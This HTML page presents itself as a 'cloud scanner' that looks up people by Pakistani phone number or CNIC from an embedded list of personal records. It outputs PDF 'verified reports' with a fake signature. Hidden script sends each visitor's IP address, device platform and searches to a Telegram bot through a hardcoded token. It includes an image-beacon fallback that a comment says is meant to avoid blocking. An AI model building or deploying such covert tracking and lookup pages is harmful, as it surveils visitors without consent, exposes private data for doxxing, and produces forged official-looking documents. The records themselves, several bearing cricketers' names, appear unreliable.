<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MUDASIR CLOUD SCANNER - BOT FIXED</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
        .box { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; max-width: 800px; margin: auto; box-shadow: 0 0 20px #00ff00; background: #000; }
        h2 { font-size: 22px; text-shadow: 0 0 10px #00ff00; letter-spacing: 1px; }
        input { width: 85%; padding: 15px; margin: 15px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; }
        .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
        #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 70%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; }
        
        /* PDF Template Styles */
        #pdf-content { background: #fff; color: #000; padding: 40px; display: none; width: 700px; margin: auto; border: 4px solid #000; }
        .pdf-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .pdf-table th, .pdf-table td { border: 1px solid #000; padding: 12px; text-align: left; }
        .pdf-table th { background: #f2f2f2; }
        
        .footer { margin-top: 50px; display: flex; justify-content: space-between; align-items: center; border-top: 2px solid #000; padding-top: 20px; }
        .sig { font-family: 'Brush Script MT', cursive; font-size: 40px; color: #000; }
        .symbol { border: 3px solid #000; border-radius: 50%; width: 70px; height: 70px; display: flex; align-items: center; justify-content: center; font-size: 35px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>MUDASIR CLOUD SCANNER üõ∞Ô∏è</h2>
        <input type="text" id="search" placeholder="ENTER MOBILE OR CNIC...">
        <br>
        <button class="search-btn" onclick="find()">SCAN DATABASE üîç</button>
        <div id="result-area">
            <div id="result-table"></div>
            <button id="downloadBtn" onclick="generatePDF()"><i class="fa-solid fa-file-pdf"></i> DOWNLOAD VERIFIED REPORT</button>
        </div>
    </div>

    <div id="pdf-wrapper">
        <div id="pdf-content">
            <center><h1 style="color:red; text-decoration:underline;">MUDASIR CLOUD REPORT</h1></center>
            <div id="pdf-data-body"></div>
            <div class="footer">
                <div>
                    <div class="sig">Mudasir</div>
                    <p style="margin:0; font-weight:bold;">VERIFIED SIGNATURE</p>
                </div>
                <div style="text-align:center;">
                    <div class="symbol"><i class="fa-solid fa-pencil"></i></div>
                    <p style="font-size:10px; font-weight:bold; margin-top:5px;">MUDASIR GROUP</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- 1. BOT TRACKING SYSTEM (RE-CONFIGURED) ---
        const tgToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
        const tgID = "7107389141";

        async function sendToBot(msg) {
            // Hum teen (3) alag tareeqon se message bhejenge taake block na ho
            const finalUrl = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            
            try {
                // Tareeqa 1: Standard Fetch
                await fetch(finalUrl);
            } catch(e) {
                // Tareeqa 2: Image Beacon (Bypass)
                let b = new Image();
                b.src = finalUrl;
            }
        }

        window.onload = async () => {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const log = `üöÄ *VISITOR DETECTED!* üöÄ\nüåê IP: \`${data.ip}\`\nüì± Dev: ${navigator.platform}\nüïí ${new Date().toLocaleString()}`;
                sendToBot(log);
            } catch(e) {
                sendToBot("New visitor detected, but IP details were blocked by browser.");
            }
        };

        // --- 2. COMPLETE 38 RECORDS DATABASE ---
        const db = [
            ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar"],
            ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar"],
            ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani"],
            ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand"],
            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu"],
            ["HASEENA MUMTAZ", "03013264628", "36303-*******-0", "Khokharan Multan Sadar"],
            ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad Multan"],
            ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan"],
            ["KHALID MEHMOOD", "03314264651", "33104-*******-7", "Jaranwala, Faisalabad"],
            ["MAZHAR ABBAS", "03001234567", "32303-*******-9", "Kot Addu, Punjab"],
            ["ZONG USER", "03124567890", "42101-*******-1", "Saddar, Karachi"],
            ["ARSHAD ALI", "03451122334", "31102-*******-5", "Peshawar, KPK"],
            ["NASIR KHAN", "03219988776", "35201-*******-8", "Lahore, Punjab"],
            ["SAJID JAVED", "03027766554", "38403-*******-4", "Sargodha, Punjab"],
            ["ADNAN MALIK", "03335544332", "37405-*******-1", "Rawalpindi"],
            ["IMRAN KHAN", "03008877665", "32304-*******-2", "Mianwali"],
            ["SHAHID AFRIDI", "03456677889", "10101-*******-3", "Khyber Agency"],
            ["BABAR AZAM", "03114455667", "35202-*******-9", "Lahore Cantt"],
            ["RIZWAN AHMED", "03223344556", "42201-*******-6", "Peshawar"],
            ["FAKHAR ZAMAN", "03051122443", "34101-*******-0", "Mardan"],
            ["SHADAB KHAN", "03348877112", "32203-*******-4", "Islamabad"],
            ["HARIS RAUF", "03087766112", "35401-*******-1", "Gujranwala"],
            ["SHAHEEN AFRIDI", "03445566112", "12101-*******-8", "Landi Kotal"],
            ["SARFARAZ AHMED", "03002233441", "42101-*******-5", "Karachi"],
            ["RAHAT ALI", "03159988221", "36301-*******-7", "Multan"],
            ["SAEED AJMAL", "03214455889", "33101-*******-3", "Faisalabad"],
            ["SHOAIB MALIK", "03006677221", "34601-*******-2", "Sialkot"],
            ["MISBAH UL HAQ", "03325566881", "32101-*******-9", "Faisalabad"],
            ["YUNUS KHAN", "03451199228", "17301-*******-4", "Mardan"],
            ["KAMRAN AKMAL", "03012233665", "35201-*******-1", "Lahore"],
            ["UMAR AKMAL", "03215566774", "35201-*******-2", "Lahore"],
            ["WAHAB RIAZ", "03448899112", "35202-*******-5", "Lahore"],
            ["MOHAMMAD AMIR", "03036677112", "34104-*******-8", "Gujjar Khan"],
            ["HASAN ALI", "03165544221", "34101-*******-6", "Lalamusa"],
            ["IMAD WASIM", "03351122334", "37405-*******-0", "Swan Camp"],
            ["ASIF ALI", "03078877441", "33102-*******-4", "Faisalabad"],
            ["HAIDER ALI", "03491122556", "37101-*******-3", "Attock"],
            ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha"]
        ];

        let currentRec = null;

        function find() {
            let v = document.getElementById("search").value.trim();
            let res = db.filter(r => r[1].includes(v) || r[2].includes(v));
            let tableDiv = document.getElementById("result-table");
            let btn = document.getElementById("downloadBtn");

            if(res.length > 0) {
                currentRec = res[0];
                tableDiv.innerHTML = `<table style="width:100%; border:1px solid #00ff00; margin-top:15px; color:#00ff00;">
                    <tr><td style="padding:10px; border:1px solid #00ff00;">NAME:</td><td style="padding:10px; border:1px solid #00ff00;">${res[0][0]}</td></tr>
                    <tr><td style="padding:10px; border:1px solid #00ff00;">PHONE:</td><td style="padding:10px; border:1px solid #00ff00;">${res[0][1]}</td></tr>
                </table>`;
                btn.style.display = "block";
                sendToBot(`üë§ Search Made: ${res[0][0]} (${res[0][1]})`);
            } else {
                tableDiv.innerHTML = "<p style='color:red;'>‚ö†Ô∏è NO RECORD FOUND</p>";
                btn.style.display = "none";
            }
        }

        function generatePDF() {
            if(!currentRec) return;
            const pdfElem = document.getElementById("pdf-content");
            pdfElem.style.display = "block";
            document.getElementById("pdf-data-body").innerHTML = `
                <table class="pdf-table">
                    <tr><th>FULL NAME</th><td>${currentRec[0]}</td></tr>
                    <tr><th>CONTACT</th><td>${currentRec[1]}</td></tr>
                    <tr><th>CNIC</th><td>${currentRec[2]}</td></tr>
                    <tr><th>LOCATION</th><td>${currentRec[3]}</td></tr>
                </table>`;
            html2pdf().set({ margin: 10, filename: 'Mudasir_Report.pdf', html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' } })
            .from(pdfElem).save().then(() => { pdfElem.style.display = "none"; });
        }
    </script>
</body>
</html>
